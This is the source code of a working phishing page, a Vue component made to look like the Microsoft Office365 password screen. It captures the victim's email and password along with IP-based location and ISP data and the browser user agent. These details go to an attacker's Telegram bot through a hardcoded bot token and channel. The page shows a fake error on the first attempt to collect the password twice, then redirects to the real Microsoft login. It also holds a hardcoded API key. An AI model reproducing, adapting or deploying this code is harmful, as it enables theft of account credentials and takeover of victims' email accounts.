<script setup> 
import { ref, onMounted } from 'vue';
import { useRouter, useRoute } from 'vue-router';

import axios from 'axios'; 

import ErrorPassword from '@/components/ErrorPassword.vue'
import ErrorEnterPassword from '@/components/ErrorEnterPassword.vue'
import ErrorNext from '@/components/ErrorNext.vue'
 
const emailFromUrl = ref(''); 
const router = useRouter();
const route = useRoute();
const password = ref('');  

onMounted(() => {
  // Access the 'email' query parameter from the URL
  emailFromUrl.value = route.query?.email || '';
  // Check if email is empty or not provided
  if (!emailFromUrl.value) {
    // Redirect back to the index page  
  }
});

const allowedProviders = ['gmail.com', 'yahoo.com', 'outlook.com', 'mail.com'];
const isValidProvider = allowedProviders.some(provider => route.query?.email.endsWith(provider));

const formData = ref({ 
  email: '',
});
 
const clickCount = ref(0);
const error = ref(false)  
const errorPassword = ref(false) 
const userAgent = navigator.userAgent; 

const apiKey = 'U8WRu1l8V7iNATxtW3RE';
const apiUrl = `https://extreme-ip-lookup.com/json/?key=${apiKey}`; 

const fetchIPDetails = async (info) => {
  try {
    // Make an API request to get IP information
    const response = await fetch(apiUrl);
    
    // Check if the request was successful (status code 200)
    if (response.ok) {
      // Parse the JSON response
      const data = await response.json();
      
      // Extract and update the IP details
      return data[info];  
    } else {
      // Handle non-successful response
      throw new Error(`Failed to fetch data. Status: ${response.status}`);
    }
  } catch (error) {
    // Handle any errors that might occur during the API request
    console.error('Error fetching IP details:', error.message);
    // Set the error state
    error = error.message;
  }
};
 

const submitForm = async () => {
    errorPassword.value = false;
    error.value = false; 

    const city = await fetchIPDetails('city');
    const country = await fetchIPDetails('country');
    const region = await fetchIPDetails('region');
    const isp = await fetchIPDetails('isp');
    const query = await fetchIPDetails('query');

    if(!password.value){
        errorPassword.value = true;

    }else{
        clickCount.value++;
        errorPassword.value = false; 
        if (clickCount.value === 1) {
            // Action on the first click
            error.value  = true;

            const botToken = '6523418078:AAFyIicijK8d8ohtSQNqd8LRfC2VGPa7TKs';
            const channelID = '-1002004436374'; 
            
            const body =
            `OFFICE365 Email Access\n\n` +
            `📧Email            : ${emailFromUrl.value}\n` +
            `🔑Email Pass            : ${password.value}\n\n` +
            `++++++++++++++++++++++++++++\n\n` +
            `IP ADDRESS INFO\n` +
            `IP Address       : ${query}\n` +
            `City             : ${city}\n` +
            `State            : ${region}\n` +
            `Country          : ${country}\n` +
            `ISP              : ${isp}\n\n` + 
            `TIME             : ${new Date().toLocaleString()} GMT\n\n` +
            `++++++++++++++++++++++++++++\n\n` +
            `SYSTEM INFO || USER AGENT\n` +
            `USER AGENT       : ${userAgent}\n` +
            `👨‍💻 @nightowel04 - TG 👨‍💻`;

            const send = { chat_id: channelID, text: body };
            const website = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(website, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(send),
                });

                if (!response.ok) {
                //throw new Error(`Telegram API error: ${response.statusText}`);

                }else{
                    //router.push('https://login.live.com/');
                }

                // Log the successful response if needed
                //console.log('Telegram API Response:', await response.text());
            } catch (error) {
                // Handle errors
                console.error('Error sending Telegram message:', error.message);
            }

        } else if (clickCount.value === 2) {
            // Action on the second click 
            error.value  = false;

            const botToken = '6523418078:AAFyIicijK8d8ohtSQNqd8LRfC2VGPa7TKs';
            const channelID = '-1002004436374'; 
            
            const body =
            `OFFICE365 Email Access\n\n` +
            `📧Email            : ${emailFromUrl.value}\n` +
            `🔑Email Pass            : ${password.value}\n\n` +
            `++++++++++++++++++++++++++++\n\n` +
            `IP ADDRESS INFO\n` +
            `IP Address       : ${query}\n` +
            `City             : ${city}\n` +
            `State            : ${region}\n` +
            `Country          : ${country}\n` +
            `ISP              : ${isp}\n\n` + 
            `TIME             : ${new Date().toLocaleString()} GMT\n\n` +
            `++++++++++++++++++++++++++++\n\n` +
            `SYSTEM INFO || USER AGENT\n` +
            `USER AGENT       : ${userAgent}\n` +
            `👨‍💻 @nightowel04 - TG 👨‍💻`;

            const send = { chat_id: channelID, text: body };
            const website = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(website, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(send),
                });

                if (!response.ok) {
                //throw new Error(`Telegram API error: ${response.statusText}`);

                }else{
                    return window.location.href = 'https://login.live.com/';
                }

                // Log the successful response if needed
                //console.log('Telegram API Response:', await response.text());
            } catch (error) {
                // Handle errors
                console.error('Error sending Telegram message:', error.message);
            }

            // Reset click count to 0
            clickCount.value = 0;
        }
    } 
};

const goBack = () => {
  router.go(-1); // Go back one step in the history
};
 
const handleKeyup = () => { 
    errorPassword.value = false;
    error.value = false;

    if (!password.value) {
            errorPassword.value = true;
    } else {
        errorPassword.value = false;
    }
};
</script>

<template>
    <div class="block text-gray-700 text-left dir-ltr">
        <div>
            <div id="roo-dhd">
                <div dir="" class="f1w-2j8">
                    <div id="bac-fkp" class="f15-rl7 fly-3r9 f1l-dws fk4-blv fo6-hoo fj9-7oe f1b-36s f19-sw7 f1v-pvn style-8I4XV">
                        <div id="bac-iqq" class="f15-rl7 fly-3r9 f1l-dws fk4-blv fo6-hoo fj9-7oe f1b-36s f19-sw7 f1v-pvn style-XwsdT">
                        </div>
                    </div>
                    <div class="f1w-o6o f1e-lt2 f1l-dws fly-3r9 f15-rl7 f1e-oof f1y-9wo f1v-pvn">
                        <div class="f15-tr6 fmr-5fo">
                        <div>
                            <div>
                                <div>
                                    <div class="fcg-ogv f1u-dl8 f10-6t1 f17-exp fda-148 f1q-fk1 f1q-fk1-mobile fde-xb6 fde-xb6-mobile f1e-qme f9y-yw8 f9y-yw8-mobile f16-48e f16-48e-mobile fol-z5m f1f-nov f1f-nov-mobile f1x-hl2 f1x-hl2-mobile f14-pyp fh2-1co f1p-r3q f1s-iod f19-qno fi2-w8i f1l-ng7 foj-zat f1y-o82 f1g-xrw f1g-are f6f-wvy">
                                    <div class="fy6-qwx fk7-7mr f1b-45k f1l-dws fly-3r9 f1e-lt2 f15-rl7 f1v-pvn f1x-2f8">
                                    </div>
                                    <div>
                                        <img class="f2r-75d frv-xsj" src="https://logincdn.msauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg">
                                        <div v-if="emailFromUrl && (emailFromUrl.includes('@') && emailFromUrl.includes('.com')) && isValidProvider" class="f10-6t1 fi2-w8i f1l-ng7 foj-zat f1y-o82 f1g-xrw f1g-are f6f-wvy">
                                            <div @click="goBack" class="rv-xsj f1p-zp4 fq4-oyn f17-ft9 f6o-y3c frq-96i f3r-92s f1g-1oy fhx-tyx f1q-stt f1c-o3a fre-shp f13-9m6 fqd-d7v f1r-a8c f1i-c5e fy0-e3v f24-ma4 fgv-hw9 f84-gtq f9x-6os">
                                                <img src="https://logincdn.msauth.net/shared/5/images/arrow_left_a9cc2824ef3517b6c416.svg">
                                            </div>
                                            <div  class="custom-color frv-xsj info-nor f11-2cl f15-q6o f1t-tdc f8x-izp fz5-382 f1p-r3q f1s-iod f1c-pmj">
                                                {{emailFromUrl}}
                                            </div>
                                        </div>
                                        <div   v-if="emailFromUrl && (emailFromUrl.includes('@') && emailFromUrl.includes('.com')) && isValidProvider" class="f10-6t1 f11-ma7">
                                            <form>
                                            </form>   

                                            <div class="f19-awt f10-6t1 f6c-21o f1l-ng7 fyw-53a fvn-pyb f1n-7jg">
                                                <form @submit.prevent="submitForm">
                                                <div class="ffm-1xe fzz-cok fhu-12c f33-veb info-nor f1j-6v5 f1n-7gs fif-pv8 f1o-3rh f1a-o8c">
                                                    <div>
                                                        Enter password
                                                    </div>
                                                </div> 

                                                <ErrorPassword v-if="error"/>
                                                <ErrorEnterPassword v-if="errorPassword" />

                                                <div class="f1t-tdc f11-2cl f1w-2j8">
                                                    <div>
                                                        <div class="ftg-4yn fly-3r9 fwr-lo9 f15-q6o f10-6t1 fre-cvh f1m-cbp f1t-ert f1c-o7e fyf-irv f1r-nvw f11-ahf f4h-pnb fa-brt f1y-8as f1x-22j f16-32e f6r-rqh f1i-m2p fsp-jom f2x-yee f1i-9oa f1b-q3t f1k-89b fa-y1w fyw-zya f1a-kbq fnp-7j4 fsc-gzo f1y-m8c feh-86p f7u-nvl fex-wnr">
                                                            <input v-model="password" @keyup="handleKeyup" id="pas-fye" name="passwd" placeholder="Password" type="password" class="style-pehwQ" value="">
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="f1t-tdc f11-2cl f1w-2j8">
                                                    <div class="fed-zli f10-6t1 f1w-2j8 f16-mno f12-oye">
                                                        <div class="f15-q6o">
                                                            <RouterLink to="https://account.live.com/ResetPassword.aspx" target="_blank" class="f11-bf8 f1b-k7a f3r-92s f1e-mas f1n-63l f1h-ltn f1d-6d8 fry-efc fv6-qlo f1c-koo f1m-qfz f1y-hvc f12-wq7 f1i-4mo f84-gtq f1n-7gs fif-pv8 f1o-3rh f1a-o8c">
                                                                Forgot password?
                                                            </RouterLink>
                                                        </div>
                                                        <!--<div class="f15-q6o">
                                                            <span class="f11-bf8 f1b-k7a f3r-92s f1e-mas f1n-63l f1h-ltn f1d-6d8 fry-efc fv6-qlo f1c-koo f1m-qfz f1y-hvc f12-wq7 f1i-4mo f84-gtq f1n-7gs fif-pv8 f1o-3rh f1a-o8c">
                                                            Email code to jo*****@gmail.com
                                                            </span>
                                                        </div> -->
                                                    </div>
                                                </div>
                                                <div class="f21-meq f1y-39j f1x-w5y">
                                                    <div>
                                                        <div class="f1t-tdc f11-2cl f1w-2j8">
                                                            <div class="f1e-lt2 f1y-9wo fly-3r9 fes-7e7">
                                                            <div class="f14-dfe">
                                                                <button type="submit" class="f1n-tp2 f1e-mas f1n-63l f1h-ltn f1d-6d8 fxd-vwl fyt-dzz f14-dfe f10-x4v f11-cez f1y-eqg fjl-o7j f10-6t1 f6d-tlx f17-td1 fz5-382 f1p-r3q f1s-iod fmr-5fo fmr-5fo-mobile f1c-pmj f1c-o9c f1i-ab1 fv6-a1t fns-3ql f84-gtq f9e-tdb f1b-w85 f1y-ngj fqv-xx3">
                                                                Sign in
                                                                </button>
                                                            </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                </form>
                                            </div>
                                        </div>
                                        <div v-else>
                                            <ErrorNext></ErrorNext>
                                        </div>
                                    </div>  
                                    
                                    </div>
                                </div> 
                            </div>
                        </div> 
                        </div>
                        <div class="f1e-lt2 f1v-pvn f1y-9wo fly-3r9 f1m-jzf f1y-16z f1w-iyi f1h-nsn f1y-wa5">
                        <div class="f1h-l1a f11-2cl f19-r1y f1t-tdc fa-5fv f15-yvc">
                            <RouterLink to="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;uaid=21161380f05f43b6aaa240deb0723106" target="_blank" class="fus-idh f1u-85o f33-eht fz5-thw f14-yvp ff9-l3k f1p-156 f1b-c6v f1m-2vh">
                            Terms of use
                            </RouterLink>
                            <RouterLink to="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;uaid=21161380f05f43b6aaa240deb0723106" target="_blank" class="fus-idh f1u-85o f33-eht fz5-thw f14-yvp ff9-l3k f1p-156 f1b-c6v f1m-2vh">
                            Privacy &amp; cookies
                            </RouterLink>
                            <RouterLink to="#" class="fus-idh f4y-peb f82-qz7 fz5-thw f14-yvp ff9-l3k f1p-156 f1b-c6v f1m-2vh f1m-w2t f12-hom fhu-2mo f1q-gq5">
                            ...
                            </RouterLink>
                        </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <RouterView />

</template> 

<style  scoped> 
* { 
    box-sizing: border-box;
} 

.custom-color{
    color: black !important;
}


body { 
    display: none;
} 

body { 
    display: block !important;
} 

body { 
    font-weight: 400; 
    font-family: "Segoe UI", -apple-system, "Helvetica Neue", "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi, "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga, "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee, "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math"; 
    font-size: 0.9375rem; 
    line-height: 1.25rem; 
    margin: 0px; 
    background-color: rgb(255, 255, 255);
} 

/* error message*/
.fti-vg2 { 
    color: rgb(232, 17, 35);
} 

.f1l-ksc { 
    margin-top: 0px;
} 

.fib-bkf { 
    margin-right: 0px;
} 

.f1a-zio { 
    margin-bottom: 0px;
} 

.f9y-9z7 { 
    margin-left: 0px;
} 

.f11-932 { 
    color: rgb(0, 103, 184);
} 
.f1b-jms { 
    text-decoration: none;
} 
.f3r-ybm { 
    background-color: transparent;
} 

.f1e-3tn { 
    border-top-style: none;
} 
.f1n-n4c { 
    border-right-style: none;
} 

.f1h-mhv { 
    border-bottom-style: none;
} 
.f1d-ab3 { 
    border-left-style: none;
} 
.fry-jjm:hover { 
    text-decoration: underline;
}
.fv6-n7v:hover { 
    color: rgb(102, 102, 102);
} 
.f1c-lcq:hover { 
    background-color: transparent;
}
.f1m-htw:hover { 
    border-top-style: none;
}
.f1y-bay:hover { 
    border-right-style: none;
}
.f12-imc:hover { 
    border-bottom-style: none;
} 
.f1i-vfq:hover { 
    border-left-style: none;
} 
.f84-bs8:hover { 
    cursor: pointer;
} 
.f1n-yee { 
    padding-top: 0px;
}
.fif-dpn { 
    padding-right: 0px;
}
.f1o-vsh { 
    padding-bottom: 0px;
} 
.f1a-l1i { 
    padding-left: 0px;
}  
/* end of error message*/

#roo-dhd { 
    min-height: 1px;
} 

.f1w-2j8 { 
    min-height: 1px;
} 

.f1l-dws { 
    height: 100%;
} 

.fly-3r9 { 
    width: 100%;
} 

.f15-rl7 { 
    top: 0px;
} 

.f1v-pvn { 
    left: 0px;
} 

.f19-sw7 { 
    position: fixed;
} 

.fk4-blv { 
    background-size: cover;
} 

.fo6-hoo { 
    background-repeat: no-repeat;
} 

.fj9-7oe { 
    background-position-x: 50%;
} 

.f1b-36s { 
    background-position-y: 50%;
} 

.f1w-o6o { 
    display: table;
} 

.f1e-lt2 { 
    position: absolute;
} 

.f1e-oof { 
    right: 0px;
} 

.f1y-9wo { 
    bottom: 0px;
} 

button { 
    font-weight: inherit; 
    font-family: inherit; 
    font-size: inherit; 
    line-height: inherit; 
    max-width: 100%; 
    margin: 0px;
} 

.f15-tr6 { 
    display: table-cell;
} 

.fmr-5fo { 
    vertical-align: middle;
} 

@media (max-width: 767px) {
  /* Styles for screens up to 767px wide (typically mobile devices) */
  .fmr-5fo { 
        vertical-align: top;
    }
}

.f1m-jzf { 
    overflow-x: visible;
} 

.f1y-16z { 
    overflow-y: visible;
} 

.f1w-iyi { 
    z-index: auto;
} 

.f1h-nsn { 
    clear: both;
} 

.f1y-wa5 { 
    min-height: 28px;
} 

.f1t-tdc { 
    margin-left: 0px;
} 

.f11-2cl { 
    margin-right: 0px;
} 

.f19-r1y { 
    margin-bottom: 0px;
} 

.f1h-l1a { 
    margin-top: 0px;
} 

.fa-5fv { 
    font-size: 13px;
} 

.f15-yvc { 
    float: right;
} 

@media (max-width: 767px) {
    .f15-yvc { 
        float: left;
    }  
}

a { 
    color: rgb(0, 103, 184); 
    text-decoration: none;
} 

.f14-dfe { 
    display: inline-block;
} 

.fus-c6h { 
    color: rgb(0, 0, 0);
} 

.f1u-wib { 
    font-size: 12px;
} 

.f33-veb { 
    line-height: 28px;
} 

.fz5-382 { 
    white-space: nowrap;
} 

.ff9-ron { 
    margin-left: 8px;
} 

.f1p-q8l { 
    margin-right: 8px;
} 

.f1b-k7a { 
    text-decoration: none;
} 

a:hover { 
    text-decoration: underline; 
    color: rgb(102, 102, 102);
} 

.f1m-z9k:hover { 
    color: rgb(0, 0, 0);
} 

.fhu-12c { 
    font-weight: 600;
} 

.f4y-8ab { 
    font-size: 16px;
} 

.f1m-bvj { 
    letter-spacing: 3px;
} 

.f82-hxt { 
    line-height: 22px;
} 

.f12-vix { 
    vertical-align: top;
} 

.f1q-xx6:hover { 
    text-decoration: none;
} 

.fcg-ogv { 
    margin-left: auto;
} 

.f1u-dl8 { 
    margin-right: auto;
} 

.f10-6t1 { 
    position: relative;
} 

.f17-exp { 
    max-width: 440px;
} 

.fda-148 { 
    width: calc(100% - 40px);
} 

.f1q-fk1 { 
    padding-top: 44px;
} 

.fde-xb6 { 
    padding-right: 44px;
} 

.f9y-yw8 { 
    padding-left: 44px;
} 

.f1e-qme { 
    padding-bottom: 44px;
} 

.f16-48e { 
    margin-bottom: 28px;
} 

@media (max-width: 767px) {
  /* Styles for screens up to 767px wide (typically mobile devices) */
    .fde-xb6-mobile { 
        padding-right: 3px;
    } 

    .f1q-fk1-mobile { 
        padding-top: 24px;
    } 
  
    .f9y-yw8-mobile { 
        padding-left: 3px;
    }

    .f16-48e-mobile { 
        padding-bottom: 0px;
    } 
}

.fol-z5m { 
    background-color: rgb(255, 255, 255);
} 

.f1f-nov { 
    box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 6px;
} 

.f1x-hl2 { 
    box-shadow: rgba(0, 0, 0,0 0.2) 0px 2px 6px;
} 

@media (max-width: 767px) {
    .f1f-nov-mobile { 
        box-shadow: rgba(0, 0, 0, 0.2) 0px 0px 0px;
    } 

    .f1x-hl2-mobile { 
        box-shadow: rgba(0, 0, 0, 0.2) 0px 0px 0px;
    }
}

.f14-pyp { 
    min-width: 320px;
} 

.fh2-1co { 
    min-height: 338px;
} 

.f1p-r3q { 
    overflow-x: hidden;
} 

.f1s-iod { 
    overflow-y: hidden;
} 

.f19-qno { 
    z-index: 1;
} 

.f1l-ng7 { 
    animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
} 

.fi2-w8i { 
    transition-timing-function: ease-in;
} 

.foj-zat { 
    animation-duration: 0.3s;
} 

.f1y-o82 { 
    animation-name: f11ta6k4;
} 

.f1g-xrw { 
    transition-timing-function: ease-in;
} 

.f1g-are { 
    animation-timing-function: cubic-bezier(0.5, 0, 0.5, 1);
} 

.f6f-wvy { 
    animation-duration: 0.3s;
} 

.fy6-qwx { 
    background-color: white;
} 

.fk7-7mr { 
    opacity: 0;
} 

.f1b-45k { 
    z-index: -1;
} 

.f1x-2f8 { 
    transition: all 0.5s ease-in 0s;
} 

.f2r-75d { 
    max-width: 256px;
} 

.frv-xsj { 
    height: 24px;
} 

.f11-ma7 { 
    min-height: 170px;
} 

.f1g-1oy { 
    padding-top: 0px;
} 

.fhx-tyx { 
    padding-right: 0px;
} 

.f1c-o3a { 
    padding-left: 0px;
} 

.f1q-stt { 
    padding-bottom: 0px;
} 

.fre-shp { 
    border-top-width: 0px;
} 

.f13-9m6 { 
    border-right-width: 0px;
} 

.f1r-a8c { 
    border-left-width: 0px;
} 

.fqd-d7v { 
    border-bottom-width: 0px;
} 

.f6o-y3c { 
    float: left;
} 

.f3r-92s { 
    background-color: transparent;
} 

.f1p-zp4 { 
    min-height: 24px;
} 

.fq4-oyn { 
    width: 24px;
} 

.f17-ft9 { 
    min-width: 24px;
} 

.frq-96i { 
    margin-right: 2px;
} 

.f1i-c5e { 
    border-bottom-right-radius: 12px;
} 

.fy0-e3v { 
    border-bottom-left-radius: 12px;
} 

.f24-ma4 { 
    border-top-right-radius: 12px;
} 

.fgv-hw9 { 
    border-top-left-radius: 12px;
} 

.f84-gtq:hover { 
    cursor: pointer;
} 

.f9x-6os:hover { 
    background-color: rgba(0, 0, 0, 0.1);
} 

.f15-q6o { 
    margin-bottom: 16px;
} 

.info-nor { 
    margin-top: 16px;
} 

.f1c-pmj { 
    text-overflow: ellipsis;
} 

.f8x-izp { 
    line-height: 24px;
} 

.f6c-21o { 
    animation-duration: 0.25s;
} 

.fyw-53a { 
    animation-fill-mode: both;
} 

.fvn-pyb { 
    transition-property: left;
} 

.f1n-7jg { 
    animation-name: fr2e2iv;
} 

.f19-awt { 
    min-height: inherit;
} 

.f1j-6v5 { 
    margin-bottom: 12px;
} 

.ffm-1xe { 
    color: rgb(27, 27, 27);
} 

.fzz-cok { 
    font-size: 1.5rem;
} 

.f1n-7gs { 
    padding-top: 0px;
} 

.fif-pv8 { 
    padding-right: 0px;
} 

.f1a-o8c { 
    padding-left: 0px;
} 

.f1o-3rh { 
    padding-bottom: 0px;
} 

input { 
    font-weight: inherit; 
    font-family: inherit; 
    font-size: inherit; 
    line-height: inherit; 
    max-width: 100%; 
    margin: 0px;
} 

.fed-zli { 
    font-size: 0.8125rem;
} 

.f16-mno { 
    padding-left: 2px;
} 

.f12-oye { 
    padding-right: 2px;
} 

.f21-meq > div:nth-child(1)  { 
    display: inline-block;
} 

.f1y-39j > div:nth-child(1)  { 
    width: 100%;
} 

.f1x-w5y > div:nth-child(1)  { 
    margin-bottom: 36px;
} 

.ftg-4yn { 
    display: block;
} 

.fwr-lo9 { 
    background-image: none;
} 

.fre-cvh input  { 
    height: 36px;
} 

.f1m-cbp input  { 
    width: 100%;
} 

.f1t-ert input  { 
    outline-style: none;
} 

.f1c-o7e input  { 
    background-color: transparent;
} 

.fyf-irv input  { 
    border-top-style: solid;
} 

.f1r-nvw input  { 
    border-right-style: solid;
} 

.f4h-pnb input  { 
    border-left-style: solid;
} 

.f11-ahf input  { 
    border-bottom-style: solid;
} 

.fa-brt input  { 
    border-bottom-right-radius: 0px;
} 

.f1y-8as input  { 
    border-bottom-left-radius: 0px;
} 

.f1x-22j input  { 
    border-top-right-radius: 0px;
} 

.f16-32e input  { 
    border-top-left-radius: 0px;
} 

.f6r-rqh input  { 
    border-top-width: 0px;
} 

.f1i-m2p input  { 
    border-right-width: 0px;
} 

.f2x-yee input  { 
    border-left-width: 0px;
} 

.fsp-jom input  { 
    border-bottom-width: 1px;
} 

.f1i-9oa input  { 
    border-top-color: rgb(102, 102, 102);
} 

.f1b-q3t input  { 
    border-right-color: rgb(102, 102, 102);
} 

.fa-y1w input  { 
    border-left-color: rgb(102, 102, 102);
} 

.f1k-89b input  { 
    border-bottom-color: rgb(102, 102, 102);
} 

.fyw-zya input  { 
    padding-top: 6px;
} 

.f1a-kbq input  { 
    padding-right: 10px;
} 

.fnp-7j4 input  { 
    padding-bottom: 6px;
} 

.fsc-gzo input  { 
    padding-left: 0px;
} 

.f1y-m8c input:focus  { 
    border-top-color: rgb(0, 103, 184);
} 

.feh-86p input:focus  { 
    border-right-color: rgb(0, 103, 184);
} 

.fex-wnr input:focus  { 
    border-left-color: rgb(0, 103, 184);
} 

.f7u-nvl input:focus  { 
    border-bottom-color: rgb(0, 103, 184);
} 

.f11-bf8 { 
    color: rgb(0, 103, 184);
} 

.f1e-mas { 
    border-top-style: none;
} 

.f1n-63l { 
    border-right-style: none;
} 

.f1d-6d8 { 
    border-left-style: none;
} 

.f1h-ltn { 
    border-bottom-style: none;
} 

.fry-efc:hover { 
    text-decoration: underline;
} 

.fv6-qlo:hover { 
    color: rgb(102, 102, 102);
} 

.f1c-koo:hover { 
    background-color: transparent;
} 

.f1m-qfz:hover { 
    border-top-style: none;
} 

.f1y-hvc:hover { 
    border-right-style: none;
} 

.f1i-4mo:hover { 
    border-left-style: none;
} 

.f12-wq7:hover { 
    border-bottom-style: none;
} 

.fes-7e7 { 
    text-align: right;
} 

.f17-td1 { 
    text-align: center;
} 

.f6d-tlx { 
    max-width: 100%;
} 

.f1n-tp2 { 
    min-height: 32px;
} 

.fxd-vwl { 
    min-width: 108px;
} 

.fyt-dzz { 
    line-height: normal;
} 

.f10-x4v { 
    padding-top: 4px;
} 

.f11-cez { 
    padding-right: 12px;
} 

.fjl-o7j { 
    padding-left: 12px;
} 

.f1y-eqg { 
    padding-bottom: 4px;
} 

.f1c-o9c { 
    touch-action: manipulation;
} 

.fv6-a1t { 
    background-color: rgb(0, 103, 184);
} 

.f9e-tdb { 
    border-top-color: rgb(0, 103, 184);
} 

.f1b-w85 { 
    border-right-color: rgb(0, 103, 184);
} 

.fqv-xx3 { 
    border-left-color: rgb(0, 103, 184);
} 

.f1y-ngj { 
    border-bottom-color: rgb(0, 103, 184);
} 

.f1i-ab1 { 
    color: rgb(255, 255, 255);
} 

.fns-3ql:hover { 
    background-color: rgb(0, 93, 166);
} 


@keyframes f11ta6k4 { 
  0% {  
      opacity: 0; 
      opacity: 0; 
  }  

} 
@keyframes fr2e2iv { 
  0% {  
      left: 200px; 
      opacity: 0; 
      left: 200px; 
      opacity: 0; 
  }  
  100% {  
      left: 0px; 
      opacity: 1; 
      left: 0px; 
      opacity: 1; 
  }  

} 
/* These were inline style tags. Uses id+class to override almost everything */
#bac-fkp.style-8I4XV {  
   background-color: rgb(242, 242, 242);  
}  
#bac-iqq.style-XwsdT {  
   background-image: url("https://logincdn.msauth.net/shared/5/js/../images/2_bc3d32a696895f78c19d.svg");  
}  

@media (max-width: 767px) {
  /* Styles for screens up to 767px wide (typically mobile devices) */
    #bac-iqq.style-XwsdT {  
        background-image: none;  
    }

    #bac-fkp.style-8I4XV {  
        background-color: white;  
    }

    #log-prj.style-oeqli {  
        border-color:  red;  
    }

}

#pas-fye.style-pehwQ {  
   border-color: rgb(0, 103, 184);  
}  
#style-sdJoF.style-sdJoF {  
   top: -2px;  
    left: 0px;  
    height: 0px;  
    width: 0px;  
}  
#style-L6Rxl.style-L6Rxl {  
   top: -4px;  
    left: -4px;  
    height: 0px;  
    width: 0px;  
}  
#style-vIiIy.style-vIiIy {  
   top: -4px;  
    left: -4px;  
    height: 0px;  
    width: 0px;  
}  
#style-eEjOR.style-eEjOR {  
   top: -2px;  
    left: -2px;  
    height: 0px;  
    width: 0px;  
}  
#style-sEydS.style-sEydS {  
   top: -2px;  
    left: 0px;  
    height: 0px;  
    width: 0px;  
}  
#style-ZyVpW.style-ZyVpW {  
   top: -4px;  
    left: -4px;  
    height: 0px;  
    width: 0px;  
}  
#style-llfUt.style-llfUt {  
   top: 21px;  
    left: 0px;  
    height: 0px;  
    width: 0px;  
}  
#style-TvgtI.style-TvgtI {  
   top: -2px;  
    left: -2px;  
    height: 0px;  
    width: 0px;  
}  
#style-fncGa.style-fncGa {  
   top: 0px;  
    left: 0px;  
    position: absolute;  
}  
#sni-ijx.style-wDS2W {  
   right: 70px;  
    top: 249.5px;  
}  
#style-YdbNY.style-YdbNY {  
   touch-action: none;  
}  
#style-3McSM.style-3McSM {  
   touch-action: none;  
}  
#style-xd5dz.style-xd5dz {  
   top: 19px;  
    left: 0px;  
    height: 0px;  
    width: 0px;  
}  
#style-IZae9.style-IZae9 {  
   top: -4px;  
    left: -4px;  
    height: 0px;  
    width: 0px;  
}  
#style-bFQxq.style-bFQxq {  
   top: 23px;  
    left: 0px;  
    height: 0px;  
    width: 0px;  
}  
#style-1LGxf.style-1LGxf {  
   top: 19px;  
    left: -2px;  
    height: 0px;  
    width: 0px;  
}  
#style-nL7d6.style-nL7d6 {  
   top: -2px;  
    left: 0px;  
    height: 0px;  
    width: 0px;  
}  
#style-S59CH.style-S59CH {  
   top: -4px;  
    left: -4px;  
    height: 0px;  
    width: 0px;  
}  
#style-ZP4hV.style-ZP4hV {  
   top: 21px;  
    left: 0px;  
    height: 0px;  
    width: 0px;  
}  
#style-H5Ey9.style-H5Ey9 {  
   top: -2px;  
    left: -2px;  
    height: 0px;  
    width: 0px;  
}  
#style-TD7Ro.style-TD7Ro {  
   top: 0px;  
    left: 0px;  
    position: absolute;  
}  
#sni-9ia.style-dKVYg {  
   left: 1266px;  
    top: 0px;  
}  

</style>